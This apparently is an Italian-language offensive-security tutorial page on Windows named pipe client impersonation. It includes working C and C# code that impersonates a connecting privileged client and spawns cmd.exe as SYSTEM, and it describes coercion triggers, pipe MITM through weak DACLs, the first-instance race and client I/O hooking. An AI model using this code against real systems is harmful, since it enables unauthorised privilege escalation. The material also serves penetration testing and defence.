# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe Client Impersonation è una primitiva di local privilege escalation che consente a un thread del server di una named pipe di adottare il contesto di sicurezza di un client che vi si connette. In pratica, un attacker che può eseguire codice con SeImpersonatePrivilege può costringere un client privilegiato (ad esempio, un servizio SYSTEM) a connettersi a una pipe controllata dall'attacker, chiamare ImpersonateNamedPipeClient, duplicare il token risultante in un primary token e avviare un processo come il client (spesso NT AUTHORITY\SYSTEM).<sup>[[2]](#references)</sup>

Questa pagina si concentra sulla tecnica di base. Per le exploit chain end-to-end che costringono SYSTEM a connettersi alla tua pipe, consulta le pagine della famiglia Potato indicate di seguito.

## TL;DR
- Crea una named pipe: \\.\pipe\<random> e attendi una connessione.
- Fai connettere un componente privilegiato (spooler/DCOM/EFSRPC/ecc.) alla pipe.
- Leggi almeno un messaggio dalla pipe, quindi chiama ImpersonateNamedPipeClient.
- Apri il token di impersonation dal thread corrente, esegui DuplicateTokenEx(TokenPrimary) e usa CreateProcessWithTokenW/CreateProcessAsUser per ottenere un processo SYSTEM.<sup>[[2]](#references)</sup>

## Requisiti e API principali
- Privilegi generalmente necessari per il processo/thread chiamante:
- SeImpersonatePrivilege per impersonare correttamente un client connesso e per usare CreateProcessWithTokenW.
- In alternativa, dopo aver impersonato SYSTEM, puoi usare CreateProcessAsUser, che potrebbe richiedere SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (questi privilegi sono disponibili quando impersoni SYSTEM).
- API principali utilizzate:<sup>[[1]](#references)[[4]](#references)</sup>
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (devi leggere almeno un messaggio prima dell'impersonation)
- ImpersonateNamedPipeClient e RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW o CreateProcessAsUser
- Livello di impersonation: per eseguire azioni utili localmente, il client deve consentire SecurityImpersonation (impostazione predefinita per molti client RPC/named-pipe locali). I client possono ridurlo usando SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION quando aprono la pipe.<sup>[[3]](#references)</sup>

## Workflow Win32 minimo (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Note:
- Se `ImpersonateNamedPipeClient` restituisce `ERROR_CANNOT_IMPERSONATE` (1368), assicurati di aver letto prima dalla pipe e che il client non abbia limitato l'impersonation al livello Identification.
- Preferisci `DuplicateTokenEx` con `SecurityImpersonation` e `TokenPrimary` per creare un primary token adatto alla creazione di processi.

## Esempio rapido in .NET
In .NET, `NamedPipeServerStream` può eseguire l'impersonation tramite `RunAsClient`. Una volta eseguita l'impersonation, duplica il thread token e crea un processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Trigger/coercioni comuni per ottenere SYSTEM sulla tua pipe
Queste tecniche inducono i servizi privilegiati a connettersi alla tua named pipe, permettendoti di impersonarli:
- Print Spooler RPC trigger (PrintSpoofer)
- Varianti di DCOM activation/NTLM reflection (RoguePotato/JuicyPotato[NG], GodPotato)
- Pipe EFSRPC (EfsPotato/SharpEfsPotato)

Consulta qui l'utilizzo dettagliato e la compatibilità:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se ti serve solo un esempio completo di creazione della pipe e impersonation per avviare SYSTEM tramite un service trigger, consulta:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Abuso di Named Pipe IPC e MITM (ACL, race della First Instance, Client Hooking)

Quando un servizio privilegiato e un processo con pochi privilegi comunicano tramite `\\.\pipe\...`, tratta la pipe come qualsiasi altro confine IPC non trusted. Oltre alla classica impersonation lato server, ACL deboli della pipe, flag di creazione non sicuri e decisioni di trust lato client possono diventare primitive di local privilege escalation.<sup>[[7]](#references)</sup>

### Enumera prima le pipe candidate
- Elenca rapidamente le pipe da PowerShell: `Get-ChildItem \\.\pipe\`
- `pipelist64.exe` di Sysinternals è utile per individuare il numero di istanze e le pipe single-instance.
- Dai priorità ai nomi usati dai servizi in esecuzione come `SYSTEM`, soprattutto helper, updater, launcher e UI broker.

### MITM tramite DACL permissive e istanze aggiuntive della pipe
- Qualsiasi processo che può comunicare con un server privilegiato può già effettuare fuzzing del suo protocollo e cercare verbi privilegiati.<sup>[[7]](#references)</sup>
- Il caso più interessante si verifica quando la DACL concede `FILE_GENERIC_WRITE`/`GENERIC_WRITE` sull'oggetto pipe. Nelle named pipe questo include implicitamente `FILE_CREATE_PIPE_INSTANCE` (`FILE_APPEND_DATA` condivide lo stesso bit), quindi un attacker può creare un'altra server instance con lo stesso nome.
- Poiché le istanze vengono abbinate in ordine FIFO, le istanze create dall'attacker e quelle legittime possono essere intercalate: crea una rogue instance con `CreateNamedPipe`, quindi apri lo stesso nome della pipe con `CreateFile` e attendi che un client reale raggiunga la rogue server instance.
- Risultato: puoi osservare, modificare, inoltrare o desincronizzare l'IPC privilegiato senza dover controllare il processo server originale.

### Race della First Instance sui security descriptor della pipe
- `lpSecurityAttributes` definisce la DACL solo quando viene creata la prima istanza di un nome di pipe.<sup>[[4]](#references)[[7]](#references)</sup>
- Se un servizio privilegiato si avvia in ritardo e non usa `FILE_FLAG_FIRST_PIPE_INSTANCE`, un attacker può pre-creare il nome della pipe con una DACL permissiva, quindi lasciare che il servizio crei istanze successive nel security context scelto dall'attacker.
- Questo trasforma l'avvio del servizio in una race condition: vinci la first instance, quindi connettiti ai client successivi o fai MITM usando l'ACL indebolita.
- Mitigazione per i defender e punto chiave da verificare per gli attacker: controlla se `CreateNamedPipe(..., dwOpenMode, ...)` include `FILE_FLAG_FIRST_PIPE_INSTANCE`. In caso contrario, prova a pre-creare la pipe prima dell'avvio del servizio.

### I controlli PID/signature sono hardening, non un confine di sicurezza
- Alcuni prodotti cercano di limitare l'accesso controllando `GetNamedPipeClientProcessId`, il path dell'immagine del processo o il signer Authenticode del client che effettua la connessione.<sup>[[7]](#references)</sup>
- Questo è utile solo finché non fai injection nel client legittimo: una volta dentro il processo trusted, erediti esattamente il contesto PID/image/signature atteso dal server.
- Per le split desktop app, strumentare il processo UI/helper con pochi privilegi è spesso più semplice che attaccare direttamente il servizio `SYSTEM`.

### Fai hook del client in base al suo modello I/O
- I/O sincrono: intercetta `NtWriteFile` prima che la syscall consumi il buffer e ispeziona/applica patch a `NtReadFile` dopo il suo ritorno.<sup>[[7]](#references)</sup>
- I/O overlapped: salva l'`OVERLAPPED`/`IoStatusBlock` osservato in `NtReadFile`, quindi ispeziona il buffer dopo il completamento di `GetOverlappedResult` o dell'attesa rilevante.
- Completion port: `GetQueuedCompletionStatus` raggiunge `NtRemoveIoCompletion`; l'`ApcContext` restituito si ricollega all'`OVERLAPPED` usato dalla read originale, rappresentando il pivot corretto per trovare il buffer ora popolato.
- Completion routine (`ReadFileEx`): la callback di completamento viene fornita come APC. Se vuoi manomettere i dati restituiti o iniettare risposte sintetiche, fai hook della completion routine reale e, per l'injection personalizzata, usa un dispatcher `QueueUserAPC` con un solo argomento che ricostruisca i 3 argomenti attesi dalla routine.<sup>[[5]](#references)[[7]](#references)</sup>

### Note sugli strumenti
- [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) fa da proxy al traffico named-pipe tramite una DLL helper iniettata ed espone un workflow simile a Burp per editing/replay.<sup>[[6]](#references)</sup>
- [thats_no_pipe](https://github.com/synacktiv/thats_no_pipe) adotta un approccio basato su Frida e si concentra sull'hooking di `NtReadFile`/`NtWriteFile` e sui pivot async/completion descritti sopra, quindi inoltra il traffico verso un workflow di editing basato su WebSocket.<sup>[[7]](#references)[[8]](#references)</sup>
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
### Considerazioni operative
- Le named pipe hanno una latenza ridotta; lunghe pause durante la modifica dei buffer possono causare il deadlock di servizi fragili.<sup>[[7]](#references)</sup>
- I client basati su overlapped/completion-port/APC richiedono hook diversi rispetto ai semplici detour di `ReadFile`/`WriteFile`.
- L'injection nel client trusted è rumorosa e generalmente va riservata allo sviluppo di exploit, al reverse engineering dei protocolli o al fuzzing in un laboratorio locale.

## Risoluzione dei problemi e aspetti problematici
- È necessario leggere almeno un messaggio dalla pipe prima di chiamare ImpersonateNamedPipeClient; in caso contrario verrà restituito ERROR_CANNOT_IMPERSONATE (1368).<sup>[[1]](#references)</sup>
- Se il client si connette con SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, il server non può eseguire una impersonation completa; verificare il livello di impersonation del token tramite GetTokenInformation(TokenImpersonationLevel).<sup>[[3]](#references)</sup>
- CreateProcessWithTokenW richiede SeImpersonatePrivilege per il chiamante. Se l'operazione fallisce con ERROR_PRIVILEGE_NOT_HELD (1314), usare CreateProcessAsUser dopo aver già eseguito l'impersonation di SYSTEM.
- Assicurarsi che il security descriptor della pipe consenta al servizio target di connettersi se si applica un hardening; per impostazione predefinita, le pipe in \\.\pipe sono accessibili in base alla DACL del server.<sup>[[3]](#references)</sup>

## Riferimenti

- [1] [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [2] [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [3] [Microsoft: Named Pipe Security and Access Rights](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-security-and-access-rights)
- [4] [Microsoft: CreateNamedPipe function](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createnamedpipea)
- [5] [Microsoft: Named Pipe Server Using Completion Routines](https://learn.microsoft.com/en-us/windows/win32/ipc/named-pipe-server-using-completion-routines)
- [6] [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)
- [7] [Synacktiv: Hooking Windows Named Pipes](https://www.synacktiv.com/en/publications/hooking-windows-named-pipes.html)
- [8] [Synacktiv: thats_no_pipe](https://github.com/synacktiv/thats_no_pipe)

{{#include ../../banners/hacktricks-training.md}}
